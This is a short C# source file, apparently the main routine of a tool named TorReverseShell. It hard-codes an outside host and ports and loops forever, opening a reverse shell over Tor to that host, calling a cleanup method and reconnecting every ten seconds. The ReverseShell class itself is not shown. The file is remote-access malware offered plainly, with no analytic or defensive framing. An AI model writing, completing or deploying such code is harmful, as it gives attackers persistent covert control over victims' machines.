namespace TorReverseShell
{
    public class Program
    {
        const string HOST = "deflame.xyz";
        const int PORT = 4200;
        const int TOR_PORT = 8421;

        public static ReverseShell reverseShell;

        public static void Main(string[] args)
        {
            while (true)
            {
                reverseShell = new ReverseShell();
                reverseShell.Start(HOST, PORT, TOR_PORT);
                reverseShell.KillShit();
                Task.Delay(10000).Wait();
            }
        }
    }
}
